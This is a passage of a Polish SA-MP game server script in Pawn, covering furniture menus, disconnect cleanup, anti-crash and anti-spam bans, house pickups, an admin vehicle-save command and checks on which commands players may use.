public OnPlayerModelSelection(playerid, response, listid, modelid)
{
	if(listid == furnmenu)
	{
        if(response)
		{
		    if(modelid == 1491)
		    {
		        ShowModelSelectionMenu(playerid, doorss, "Drzwi");
		    }
		    if(modelid == 19355)
		    {
		        ShowModelSelectionMenu(playerid, walls, "Sciany");
		    }
		    if(modelid == 1704)
		    {
		        ShowModelSelectionMenu(playerid, chairs, "Krzesla");
		    }
		    if(modelid == 2566)
		    {
		        ShowModelSelectionMenu(playerid, beds, "Lozka");
		    }
		    if(modelid == 2311)
		    {
		        ShowModelSelectionMenu(playerid, tables, "Stoly");
		    }
		    if(modelid == 2069)
		    {
		        ShowModelSelectionMenu(playerid, lightss, "Oswietlenie");
		    }
		    if(modelid == 1985)
		    {
		        ShowModelSelectionMenu(playerid, fitness, "Fitness");
		    }
		    if(modelid == 1792)
		    {
		        ShowModelSelectionMenu(playerid, eletronic, "Elektronika");
		    }
		    if(modelid == 2867)
		    {
		        ShowModelSelectionMenu(playerid, kitchen, "Kuchnia");
		    }
		    if(modelid == 2526)
		    {
		        ShowModelSelectionMenu(playerid, bathroom, "Lazienka");
		    }
		}
		else return 1;
	}
	if(listid == doorss)
	{
		if(response)
		{
			new Float:pos[3];
			GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
			FurnObject[playerid] = CreatePlayerObject(playerid, modelid, pos[0]+4, pos[1], pos[2], 0, 0, 0, 0.0);
			SetPVarInt(playerid, "EditorMode", 1);
			FurnID[playerid] = modelid;
			EditPlayerObject(playerid, FurnObject[playerid]);
		}
		else return 1;
	}
	if(listid == walls)
	{
		if(response)
		{
			new Float:pos[3];
			GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
			FurnObject[playerid] = CreatePlayerObject(playerid, modelid, pos[0]+4, pos[1], pos[2], 0, 0, 0, 0.0);
			SetPVarInt(playerid, "EditorMode", 1);
			FurnID[playerid] = modelid;
			EditPlayerObject(playerid, FurnObject[playerid]);
		}
		else return 1;
	}
	if(listid == chairs)
	{
		if(response)
		{
			new Float:pos[3];
			GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
			FurnObject[playerid] = CreatePlayerObject(playerid, modelid, pos[0]+4, pos[1], pos[2], 0, 0, 0, 0.0);
			SetPVarInt(playerid, "EditorMode", 1);
			FurnID[playerid] = modelid;
			EditPlayerObject(playerid, FurnObject[playerid]);
		}
		else return 1;
	}
	if(listid == beds)
	{
		if(response)
		{
			new Float:pos[3];
			GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
			FurnObject[playerid] = CreatePlayerObject(playerid, modelid, pos[0]+4, pos[1], pos[2], 0, 0, 0, 0.0);
			SetPVarInt(playerid, "EditorMode", 1);
			FurnID[playerid] = modelid;
			EditPlayerObject(playerid, FurnObject[playerid]);
		}
		else return 1;
	}
	if(listid == tables)
	{
		if(response)
		{
			new Float:pos[3];
			GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
			FurnObject[playerid] = CreatePlayerObject(playerid, modelid, pos[0]+4, pos[1], pos[2], 0, 0, 0, 0.0);
			SetPVarInt(playerid, "EditorMode", 1);
			FurnID[playerid] = modelid;
			EditPlayerObject(playerid, FurnObject[playerid]);
		}
		else return 1;
	}
	if(listid == lightss)
	{
		if(response)
		{
			new Float:pos[3];
			GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
			FurnObject[playerid] = CreatePlayerObject(playerid, modelid, pos[0]+4, pos[1], pos[2], 0, 0, 0, 0.0);
			SetPVarInt(playerid, "EditorMode", 1);
			FurnID[playerid] = modelid;
			EditPlayerObject(playerid, FurnObject[playerid]);
		}
		else return 1;
	}
	if(listid == fitness)
	{
		if(response)
		{
			new Float:pos[3];
			GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
			FurnObject[playerid] = CreatePlayerObject(playerid, modelid, pos[0]+4, pos[1], pos[2], 0, 0, 0, 0.0);
			SetPVarInt(playerid, "EditorMode", 1);
			FurnID[playerid] = modelid;
			EditPlayerObject(playerid, FurnObject[playerid]);
		}
		else return 1;
	}
	if(listid == eletronic)
	{
		if(response)
		{
			new Float:pos[3];
			GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
			FurnObject[playerid] = CreatePlayerObject(playerid, modelid, pos[0]+4, pos[1], pos[2], 0, 0, 0, 0.0);
			SetPVarInt(playerid, "EditorMode", 1);
			FurnID[playerid] = modelid;
			EditPlayerObject(playerid, FurnObject[playerid]);
		}
		else return 1;
	}
	if(listid == kitchen)
	{
		if(response)
		{
			new Float:pos[3];
			GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
			FurnObject[playerid] = CreatePlayerObject(playerid, modelid, pos[0]+4, pos[1], pos[2], 0, 0, 0, 0.0);
			SetPVarInt(playerid, "EditorMode", 1);
			FurnID[playerid] = modelid;
			EditPlayerObject(playerid, FurnObject[playerid]);
		}
		else return 1;
	}
	if(listid == bathroom)
	{
		if(response)
		{
			new Float:pos[3];
			GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
			FurnObject[playerid] = CreatePlayerObject(playerid, modelid, pos[0]+4, pos[1], pos[2], 0, 0, 0, 0.0);
			SetPVarInt(playerid, "EditorMode", 1);
			FurnID[playerid] = modelid;
			EditPlayerObject(playerid, FurnObject[playerid]);
		}
		else return 1;
	}
	return 1;
}

public OnPlayerDisconnect(playerid, reason)
{
    if(BattleTimer[playerid] > 0 && reason != 0 && reason != 2) {
		Player[playerid][Exp] -= 30;
		if(Player[playerid][Exp] < 0) Player[playerid][Exp] = 0;
		new strupw[256], strupwen[256];
		format(strupw, sizeof(strupw), ""C_NICK"%s(%d) "C_RED"uciek³ podczas walki. Straci³ "C_WHITE"30 "C_RED"EXP.", Player[playerid][Name], playerid);
		format(strupwen, sizeof(strupwen), ""C_NICK"%s(%d) "C_RED"escaped during the fight. He lost "C_WHITE"30 "C_RED"EXP.", Player[playerid][Name], playerid);
		SendClientMessageToAllEx(-1, strupw, strupwen); }
	AFKTimer[playerid] = 0;
	if(EVUczestnik[playerid]) {
		EVUczestnik[playerid] = false;
		EVPlayers--; }
	if(OnGame[playerid] == BA && Wystartowala[BA]) {
		Loop(teamy, MAX_BATEAMS) {
			if(BATeam[playerid] == teamy) WypiszZabawa(playerid); } }
	switch(reason)
    {
        case 0:
        {
			Loop(loopid, MAX_PLAYERS)
			{
	    		if(Crasher[loopid] == playerid)
	    		{
	    		    if(Crashed[loopid] < 3 && Crashed[loopid] > 0)
	    		    {
						new plrIP[16], msgs[256];
						GetPlayerIp(loopid, plrIP, sizeof(plrIP));
	    				format(msgs, sizeof(msgs), ""C_NICK"Serwer "C_RED"czasowo zbanowa³ gracza "C_NICK"%s(%d) "C_RED"("C_WHITE"1h, Crasher A"C_RED")", Player[loopid][Name], loopid);
						SendClientMessageToAll(RED, msgs);
						SendClientMessage(loopid, RED, "Uwa¿asz, ¿e na³o¿ona kara jest nies³uszna? Z³ó¿ apelacjê na naszym forum: "C_WHITE""FORUM""C_RED".");
						m_query("INSERT INTO bans (uid, bantime, ip, adminname, reason, isperm, expire) VALUES (%d, %d, '%s', 'Serwer', 'Crasher A', 0, %d)", Player[loopid][ID], gettime(), plrIP, gettime() + 3600);
 						DelayedKick(loopid);
	 					bans++;
					}
	    		    if(Crashed[loopid] > 2 && IsPlayerConnected(loopid))
	    		    {
						new plrIP[16], msgs[256];
						GetPlayerIp(loopid, plrIP, sizeof(plrIP));
	    				format(msgs, sizeof(msgs), ""C_NICK"Serwer "C_RED"czasowo zbanowa³ gracza "C_NICK"%s(%d) "C_RED"("C_WHITE"7d, Crasher B"C_RED")", Player[loopid][Name], loopid);
						SendClientMessageToAll(RED, msgs);
						SendClientMessage(loopid, RED, "Uwa¿asz, ¿e na³o¿ona kara jest nies³uszna? Z³ó¿ apelacjê na naszym forum: "C_WHITE""FORUM""C_RED".");
						m_query("INSERT INTO bans (uid, bantime, ip, adminname, reason, isperm, expire) VALUES (%d, %d, '%s', 'Serwer', 'Crasher B', 0, %d)", Player[loopid][ID], gettime(), plrIP, gettime() + 604800);
 						DelayedKick(loopid);
	 					bans++;
					}
				}
			}
		}
	}
	Loop(loopid, MAX_PLAYERS) {
	    if(Player[loopid][Admin] > 0 && Player[loopid][IsLoggedIn] && !BustedMode[loopid]) {
	        new adminstr[256];
			if(reason == 0) format(adminstr, sizeof(adminstr), "{B52D26}[crash] %s (IP: "C_WHITE"%s, %s-%s, %s{B52D26})", Player[playerid][Name], ppip[playerid], kraj[playerid], miasto[playerid], isp[playerid]);
			if(reason == 1) format(adminstr, sizeof(adminstr), "{B52D26}[disconnect] %s (IP: "C_WHITE"%s, %s-%s, %s{B52D26})", Player[playerid][Name], ppip[playerid], kraj[playerid], miasto[playerid], isp[playerid]);
			if(reason == 2) format(adminstr, sizeof(adminstr), "{B52D26}[kick] %s (IP: "C_WHITE"%s, %s-%s, %s{B52D26})", Player[playerid][Name], ppip[playerid], kraj[playerid], miasto[playerid], isp[playerid]);
			SendClientMessage(loopid, RED, adminstr); } }
	new msg[256];
	format(msg, sizeof(msg), "[%02d:%02d:%02d] [disconnect] %s (%d) (IP: %s).", hour, minute, second, Player[playerid][Name], playerid, ppip[playerid]);
   	DCC_SendChannelMessage(samp_admin, msg);

	gracze--;
	Crasher[playerid] = -1;
	Crashed[playerid] = 0;
	if(LowienieTrwa[playerid]) FishingEnd(playerid);
	if(EVOrganizator[playerid]) {
	    SendClientMessageToAll(-1, ""C_ZABAWA"Event zakoñczony z powodu wyjœcia organizatora.");
	    EventEnd(); }
  	if(NapadID[playerid] > -1) {
  	    new napad = NapadID[playerid];
	   	NapadID[playerid] = -1;
	    NapadTime[napad] = -1;
		Atakuje[napad] = -1;
		SendClientMessageEx(playerid, RED, "Twój napad zosta³ przerwany.", "Your attack has been interrupted."); }
	m_query("DELETE FROM raporty WHERE reportedid = %d", playerid);
	ResetUFO(playerid);
	ClanStrefa[playerid] = false; 
	ClanPatriot[playerid] = false; 
	ClanPunkt[playerid] = false; 
 	KilledBy[playerid] = 0;
	if(pArena[playerid] > 0) {
		RemoveFromArena(playerid);
		pArena[playerid] = 0; }
	if(zw[playerid] > 0) {
	    zw[playerid] = 0;
	    zwTimer[playerid] = 0; }
 	m_query("UPDATE players SET playerid = -1 WHERE id = %d", Player[playerid][ID]);
 	if(Player[playerid][ID] != -1) SaveAllData(playerid);
	if(Player[playerid][Vip] > gettime() && Player[playerid][IsLoggedIn]) vips--; 
	if(Player[playerid][Admin] > 0 && Player[playerid][IsLoggedIn]) admins--; 
	if(OnGame[playerid] != -1) WypiszZabawa(playerid);
	if(TPP[playerid] > 0) TPP[playerid] = 0;
	Player[playerid][Skin] = GetPlayerSkin(playerid);
 	if(Attacker[playerid]) wattackers--;
	if(Deffender[playerid]) wdeffenders--;
	NaWojnie[playerid] = false;
 	pMinutes[playerid] = 0;
  	pHours[playerid] = 0;
  	Opcja[playerid] = 0;
   	if(NaSpedycji[playerid]) ForceEndSpedycja(playerid);
   	if(IsTaksowkarz[playerid] > 0) ZakonczTaksowkarz(playerid);
   	if(NaCzyszczeniu[playerid]) ZakonczCzyszczenie(playerid);
   	if(NaZbieraniu[playerid]) ZakonczZbieranie(playerid);
   	if(NaKoszeniu[playerid]) ZakonczKoszenie(playerid);
   	if(NaZrzucie[playerid]) ZakonczZrzut(playerid);
   	if(NaNurku[playerid]) EndNurek(playerid);
	if(pFight[playerid])
	{
	    pFight[playerid] = false;
	    Loop(loopid, MAX_PLAYERS)
	    {
	        if(pEnemy[loopid] == playerid && IsPlayerConnected(loopid))
	        {
	   			SetPlayerInterior(playerid, 0);
	   			SetPlayerInterior(loopid, 0);
	   			SetPlayerVirtualWorld(playerid, 0);
	   			SetPlayerVirtualWorld(loopid, 0);
	    		pFight[loopid] = false;
	    		pEnemy[loopid] = -1;
	    		pEnemy[playerid] = -1;
	    		pFight[playerid] = false;
	    		AddExp(loopid, 30);
	    		Player[playerid][Exp] -= 10;
	    		if(Player[playerid][Exp] < 0) Player[playerid][Exp] = 0;
	    		Player[loopid][Solo]++;
	    		new solomsg[256], solomsgen[256];
	    		format(solomsg, sizeof(solomsg), ""C_NICK"%s(%d) {CCFF33}wygrywa pojedynek solo z "C_NICK"%s(%d){CCFF33}!", Player[loopid][Name], loopid, Player[playerid][Name], playerid);
	    		format(solomsgen, sizeof(solomsgen), ""C_NICK"%s(%d) {CCFF33}won solo battle with "C_NICK"%s(%d){CCFF33}!", Player[loopid][Name], loopid, Player[playerid][Name], playerid);
				SendClientMessageToAllEx(-1, solomsg, solomsgen);
				SetPlayerHealth(playerid, 100.0);
				SetPlayerArmour(playerid, 100.0);
				SetPlayerHealth(loopid, 100.0);
				SetPlayerArmour(loopid, 100.0);
				SpawnFunction(loopid);
				SpawnFunction(playerid);
	        }
		}
	}
	if(Player[playerid][IsLoggedIn]) {
	    pMinutes[playerid] = 0;
	    pHours[playerid] = 0; }

	Player[playerid][IsLoggedIn] = false;
	if(vSpawned[playerid]) {
		DestroyVehicle(pVeh[playerid]);
 		vSpawned[playerid] = false; }
	Loop(x, MAX_PLAYERS) { if(LastPM[x] == playerid) LastPM[x] = -1; }
	Player[playerid][IsLoggedIn] = false;
	return 1;
}

hook_ClearAnimations(playerid, forcesync = 0)
{
	SetPlayerArmedWeapon(playerid, 0);
	return ClearAnimations(playerid, forcesync);
}

forward ResetShoots(playerid);
public ResetShoots(playerid) Shooter[playerid] = 0;

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	if(ReflexType == 5) {
		AddExp(playerid, 40);
		Player[playerid][Cash] += 5000;
		Player[playerid][Czat]++;
  		new kodstr[256];
	  	format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
		SendClientMessageToAll(-1, kodstr);
		ReflexType = -1;
		ReflexActive = false;
		Loop(loopid, MAX_PLAYERS) {
		    if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); } }
	if(!ispassenger) {
		new modelid = GetVehicleModel(vehicleid);
	    new vistr[128], vistren[128];
		format(vistr, sizeof(vistr), ""C_GREEN"Wsiadasz do pojazdu "C_WHITE"%s "C_GREEN"("C_WHITE"%d"C_GREEN").", GetVehicleName(vehicleid), modelid);
		format(vistren, sizeof(vistren), ""C_GREEN"You are entering "C_WHITE"%s "C_GREEN"("C_WHITE"%d"C_GREEN").", GetVehicleName(vehicleid), modelid);
		SendClientMessageEx(playerid, GREEN, vistr, vistren);
		Shooter[playerid]++;
		SetTimerEx("ResetShoots", 3000, 0, "i", playerid);
		if(Shooter[playerid] > 5 && Shooter[playerid] < 7) return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA"", "{f44242}Uwa¿aj! Przez spamowanie wchodzeniem do pojazdów mo¿esz zostaæ wyrzucony!", "Zamknij", "");
		if(Shooter[playerid] > 6 && Shooter[playerid] < 8) return SetPlayerHealth(playerid, 0.0);
		if(Shooter[playerid] >= 8) {
		    new msgs[256], msgsen[256];
			format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Car Spam"C_RED")", Player[playerid][Name], playerid);
			format(msgsen, sizeof(msgsen), ""C_NICK"%s(%d) "C_RED"kicked ("C_WHITE"Car Spam"C_RED")", Player[playerid][Name], playerid);
			if(!KickMsg[playerid]) SendClientMessageToAllEx(RED, msgs, msgsen);
			KickMsg[playerid] = true;
			Shooter[playerid] = 0;
			Kick(playerid);
			return kicks++; }
	}
	Loop(privcarid, privcars)
	{
	    if(vehicleid == ppVeh[privcarid] && pOwner[privcarid] != Player[playerid][ID] && !ispassenger)
		{
			if(Player[playerid][Admin] < 1) hook_ClearAnimations(playerid);
			else
			{
				new infostr[256];
				format(infostr, sizeof(infostr), "{19EFFF}Jako administrator mo¿esz przeparkowaæ ten pojazd komend¹ "C_WHITE"/forcesave %d{19EFFF}.", pOwner[privcarid]);
				SendClientMessage(playerid, -1, infostr);
			}
		}
	}
	return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{
   	if(NaSpedycji[playerid]) {
   		ForceEndSpedycja(playerid);
   		NaSpedycji[playerid] = false; }
   	if(NaKoszeniu[playerid]) {
   		ZakonczKoszenie(playerid);
   		NaKoszeniu[playerid] = false; }
   	if(NaCzyszczeniu[playerid]) {
	   ZakonczCzyszczenie(playerid);
	   NaCzyszczeniu[playerid] = false; }
	if(IsTaksowkarz[playerid] > 0) {
		ZakonczTaksowkarz(playerid);
		IsTaksowkarz[playerid] = 0; }
   	if(NaZbieraniu[playerid]) {
   		ZakonczZbieranie(playerid);
   		NaZbieraniu[playerid] = false; }
   	if(NaZrzucie[playerid]) {
	   ZakonczZrzut(playerid);
	   NaZrzucie[playerid] = false; }
	if(Wystartowala[DB])
	{
	    if(OnGame[playerid] == DB)
	    {
	        WypiszZabawa(playerid);
	    }
	}
   	return 1;
}

forward LosowanieG();
public LosowanieG()
{
	if(gracze < 4) return 1;
	new wid = random(MAX_PLAYERS);
	if(!IsPlayerConnected(wid)) return LosowanieG();
	new exp = random(399) + 1;
 	AddExp(wid, exp);
	new wstr[256], wstren[256];
	format(wstr, sizeof(wstr), ""PYTAJNIK""C_NICK"%s(%d) "C_ZABAWA"zosta³ wylosowany. Zdobywa "C_WHITE"%d EXP"C_ZABAWA"!", Player[wid][Name], wid, exp);
	format(wstren, sizeof(wstren), ""PYTAJNIK""C_NICK"%s(%d) "C_ZABAWA"received "C_WHITE"%d EXP"C_ZABAWA" from server!", Player[wid][Name], wid, exp);
	SendClientMessageToAllEx(-1, wstr, wstren);
	return 1;
}

CMD:forcesave(playerid, params[])
{
	if(Player[playerid][Admin] < 2) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "ADMIN""C_RED" lub wy¿szej.");
	if(isnull(params)) return SyntaxError(playerid, "{01FCFF}/forcesave [ownerid]");
	new ownerid = strval(params);
	Loop(privcarid, privcars)
	{
	    if(pOwner[privcarid] == ownerid)
	    {
	        if(!IsPlayerInVehicle(playerid, ppVeh[privcarid])) return 1;
 	    	new Float:x, Float:y, Float:z, Float:a;
		  	GetPlayerPos(playerid, x, y, z);
			GetVehicleZAngle(ppVeh[privcarid], a);
			prX[privcarid] = x;
			prY[privcarid] = y;
			prZ[privcarid] = z;
			prA[privcarid] = a;
			m_query("UPDATE privcars SET x = %.3f, y = %.3f, z = %.3f, a = %.3f WHERE ownerid = %d", x, y, z, a, ownerid);
			SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Spawn prywatnego pojazdu zapisany w tym miejscu.");
	    }
	}
	return 1;
}

public OnPlayerPickUpDynamicPickup(playerid, pickupid)
{
    if(pData[playerid][InHouse] == INVALID_HOUSE_ID && GetTickCount() > GetPVarInt(playerid, "HouseEnterTick"))
	{
		foreach(new i : Houses)
		{
    	    if(pickupid == HouseData[i][HousePickup])
		    {
				SetPVarInt(playerid, "HouseEnterTick", GetTickCount() + 5000);
			    pData[playerid][PickupHouseID] = i;

				if(HouseData[i][pUID] == -1) {
					new string[300];
					format(string, sizeof(string), ""C_LOLIVE"Ten dom jest na sprzeda¿!\n"C_ORANGE"Cena: "C_WHITE"%s$\n"C_ORANGE"Op³ata za dobê: "C_WHITE"%d EXP", convertNumber(HouseData[i][Price]), HouseData[i][Czynsz]);
					new number[128];
					format(number, sizeof(number), ""C_BLUE1"Dom na sprzeda¿");
					ShowPlayerDialog(playerid, DIALOG_DOM, DIALOG_STYLE_MSGBOX, number, string, "Kup", "Zamknij");
				}
				else {
  		 			GameTextForPlayer(playerid, "~w~~h~/wejdz~n~/wyjdz", 4000, 3); }

				break;
			}
		}
	}
	if(OnGame[playerid] == TR && TRRundaTrwa && TRType == 6 && TRHajs[playerid] < 3000)
	{
	    Loop(hajs, MAX_TRHAJS)
	    {
	        if(pickupid == HajsPickup[hajs])
	        {
	            DestroyDynamicPickup(HajsPickup[hajs]);
	            HajsPodniesiony[hajs] = true;
	            TRHajs[playerid] += 1000;
	            if(TRHajs[playerid] >= 3000)
	            {
	              if(!WykonalTR[playerid]) {
    				WykonalTR[playerid] = true;
    				PlayerPlaySound(playerid,1139,0.0,0.0,0.0);
    				GameTextForPlayer(playerid, "~g~~h~~h~ZADANIE WYKONANE!", 4000, 3); }
	            }
	        }
	    }
	}
	if(pickupid == FigurkaPickup)
	{
		if(Player[playerid][Admin] < 1 && ZnajdzkaActive && ZnajdzkaType == 1) {
		    ZnajdzkaActive = false;
		    ZnajdzkaType = -1;
		    DestroyDynamicPickup(FigurkaPickup);
		   	Loop(loopid, MAX_PLAYERS && IsPlayerConnected(loopid)) {
				if(TDOn[loopid]) {
				TextDrawHideForPlayer(loopid, Textdraw[18]);
				TextDrawHideForPlayer(loopid, Textdraw[19]); } }
			new exp = random(100);
			new imsg[256];
			format(imsg, sizeof(imsg), ""C_NICK"%s(%d) {F493FF}znajduje figurkê i otrzymuje "C_WHITE"%d {F493FF}EXP!", Player[playerid][Name], playerid, exp);
			AddExp(playerid, exp);
			return SendClientMessageToAll(-1, imsg); }
	}
	if(pickupid == WalizkaPickup)
	{
		if(Player[playerid][Admin] < 1 && ZnajdzkaActive && ZnajdzkaType == 2) {
		    ZnajdzkaActive = false;
		    ZnajdzkaType = -1;
		    DestroyDynamicPickup(WalizkaPickup);
		   	Loop(loopid, MAX_PLAYERS) {
				if(TDOn[loopid] && IsPlayerConnected(loopid)) {
				TextDrawHideForPlayer(loopid, Textdraw[18]);
				TextDrawHideForPlayer(loopid, Textdraw[19]); } }
			new exp = random(100);
			new imsg[256];
			format(imsg, sizeof(imsg), ""C_NICK"%s(%d) {62F442}znajduje walizkê i otrzymuje "C_WHITE"%d {62F442}EXP!", Player[playerid][Name], playerid, exp);
			AddExp(playerid, exp);
			return SendClientMessageToAll(-1, imsg); }
	}
	if(pickupid == BombaPickup && ZnajdzkaActive && ZnajdzkaType == 3) {
		if(Player[playerid][Admin] > 0) return 1;
		return ShowPlayerDialog(playerid, DIALOG_BOMBA, DIALOG_STYLE_MSGBOX, "{FF6B6B}Bomba", "{FF6B6B}Wybierz kolor kabla, który chcesz przeci¹æ.", "Czerwony", "Niebieski"); }
  Loop(partid, parts)
  {
    if(pickupid == PartPickup[partid])
    {
      if(!POnMap[partid]) return 1;
      if(Player[playerid][CPick] > 7) return SendClientMessage(playerid, RED, "Posiadasz ju¿ maksymaln¹ iloœæ czêœci.");
      POnMap[partid] = false;
      DestroyDynamicPickup(PartPickup[partid]);
      Sound(playerid, 1139, 0.0, 0.0, 0.0);
      Delete3DTextLabel(PartTD[partid]);
      Player[playerid][CPick]++;
    }
  }
	return 1;
}

public OnPlayerCommandReceived(playerid, cmdtext[]) 
{
	if(GetPVarInt(playerid, "ConnectStream") == 1 || !Player[playerid][IsLoggedIn]) return SendClientMessage(playerid, RED, ""C_RED"Zaloguj siê, aby móc u¿yæ tej funkcji."), 0;
    if(SQLInjection(cmdtext))
    {
		if(pAch[playerid][1] < 1) {
			pAch[playerid][1] = 1;
			AddExp(playerid, 200);
			Sound(playerid,1137,0.0,0.0,0.0);
			SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Haker", "New achievement: "C_NICK"Haker"); }
		return 1;
    }
    if(GetPVarInt(playerid,"Skok") > gettime()) return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz teraz wykonaæ tej komendy."), 0;
    if(JailTimeP[playerid] > 0) return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz teraz wykonaæ tej komendy."), 0;
    if(OnTutorial[playerid]) return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz teraz wykonaæ tej komendy."), 0;
    if(isCbug[playerid]) return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz teraz wykonaæ tej komendy."), 0;
	if(IsPlayerFalling(playerid)) return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz teraz wykonaæ tej komendy."), 0;
    if(Kopie[playerid]) {
        if(!strcmp(cmdtext, "/pm", true)) return 1;
        if(!strcmp(cmdtext, "/do", true)) return 1;
		return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz teraz wykonaæ tej komendy."), 0; }
	if(IsDead[playerid]) return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz teraz wykonaæ tej komendy."), 0;
	if(NaSpedycji[playerid]) {
	    if(!strcmp(cmdtext, "/pm", true)) return 1;
	    if(!strcmp(cmdtext, "/do", true)) return 1;
		return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz u¿ywaæ komend w trakcie wykonywania spedycji."), 0; }
	if(NaKoszeniu[playerid]) {
	    if(!strcmp(cmdtext, "/pm", true)) return 1;
	    if(!strcmp(cmdtext, "/do", true)) return 1;
		return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz u¿ywaæ komend w trakcie koszenia trawy."), 0; }
	if(IsTaksowkarz[playerid] > 0) {
	    if(!strcmp(cmdtext, "/pm", true)) return 1;
	    if(!strcmp(cmdtext, "/do", true)) return 1;
		return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz u¿ywaæ komend w trakcie pracy taksówkarza."), 0; }
	if(NaCzyszczeniu[playerid]) {
	    if(!strcmp(cmdtext, "/pm", true)) return 1;
	    if(!strcmp(cmdtext, "/do", true)) return 1;
		return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz u¿ywaæ komend w trakcie czyszczenia ulic."), 0; }
	if(NaZrzucie[playerid]) {
	    if(!strcmp(cmdtext, "/pm", true)) return 1;
	    if(!strcmp(cmdtext, "/do", true)) return 1;
		return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz u¿ywaæ komend w trakcie zrzutu paczki."), 0; }
	if(EVUczestnik[playerid]) {
	    if(!strcmp(cmdtext, "/pm", true)) return 1;
	    if(!strcmp(cmdtext, "/do", true)) return 1;
	    if(!strcmp(cmdtext, "/evl", true)) return 1;
		return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz u¿ywaæ komend w trakcie eventu."), 0; }
	if(NaNurku[playerid]) {
	    if(!strcmp(cmdtext, "/pm", true)) return 1;
	    if(!strcmp(cmdtext, "/do", true)) return 1;
		if(!strcmp(cmdtext, "/leave", true)) return 1;
		return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz u¿ywaæ komend w trakcie nurkowania. ("C_WHITE"/leave"C_RED")"), 0; }
	if(pFight[playerid]) return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz u¿ywaæ komend w trakcie pojedynku solo."), 0;
	if(zw[playerid] > 0) {
    	if(!strcmp(cmdtext, "/jj", true)) return 1;
		return SendClientMessage(playerid, RED, ""C_RED"Jesteœ na ZW. Wróæ wpisuj¹c "C_WHITE"/jj"C_RED"."), 0; }
	if(OnGame[playerid] != -1)
	{
	    new cgameid = OnGame[playerid];
	    if(Wystartowala[cgameid])
	    {
	    	if(!strcmp(cmdtext, "/leave", true)) return 1;
			return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz u¿ywaæ komend na zabawach. ("C_WHITE"/leave"C_RED")"), 0;
		}
	}
	if(pArena[playerid] > 0) {
	    if(!strcmp(cmdtext, "/pm", true)) return 1;
	    if(!strcmp(cmdtext, "/do", true)) return 1;
	  	if(!strcmp(cmdtext, "/leave", true)) return 1;
		return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz u¿ywaæ komend na arenach. ("C_WHITE"/leave"C_RED")"), 0; }
	if(ClanStrefa[playerid])
	{
	    if(!strcmp(cmdtext, "/pm", true)) return 1;
	    if(!strcmp(cmdtext, "/do", true)) return 1;
	   	if(!strcmp(cmdtext, "/cccancel", true)) return 1;
	   	return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz u¿ywaæ komend podczas tworzenia klanu. ("C_WHITE"/cccancel"C_RED")"), 0;
	}
	if(ClanPatriot[playerid])
	{
	    if(!strcmp(cmdtext, "/pm", true)) return 1;
	    if(!strcmp(cmdtext, "/do", true)) return 1;
	   	if(!strcmp(cmdtext, "/cccancel", true)) return 1;
	   	if(!strcmp(cmdtext, "/v patriot", true)) return 1;
	   	return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz u¿ywaæ komend podczas tworzenia klanu. ("C_WHITE"/v patriot"C_RED")"), 0;
	}
	if(ClanPunkt[playerid])
	{
	    if(!strcmp(cmdtext, "/pm", true)) return 1;
	    if(!strcmp(cmdtext, "/do", true)) return 1;
	   	if(!strcmp(cmdtext, "/cccancel", true)) return 1;
	   	if(!strcmp(cmdtext, "/v", true)) return 1;
	   	return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz u¿ywaæ komend podczas tworzenia klanu. ("C_WHITE"/cccancel"C_RED")"), 0;
	}
	if(NaWojnie[playerid])
	{
	    if(!strcmp(cmdtext, "/pm", true)) return 1;
	    if(!strcmp(cmdtext, "/do", true)) return 1;
	   	return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz u¿ywaæ komend podczas wojny klanowej."), 0;
	}
	if(BattleTimer[playerid] > 0) return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz u¿ywaæ komend po walce lub w jej trakcie."), 0;
	return 1;
}

public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
	if(GetPVarInt(playerid, "ConnectStream") == 1 || !Player[playerid][IsLoggedIn]) return SendClientMessage(playerid, RED, ""C_RED"Zaloguj siê, aby móc u¿yæ tej funkcji."), 0;
	if(GetPVarInt(playerid,"Komenda") > gettime()) return DialogError(playerid, "{FFFF00}Nie nadu¿ywaj wykonywania komend.");
   	SetPVarInt(playerid,"Komenda",gettime()+1);
    if(SQLInjection(cmdtext))
    {
		if(pAch[playerid][1] < 1) {
			pAch[playerid][1] = 1;
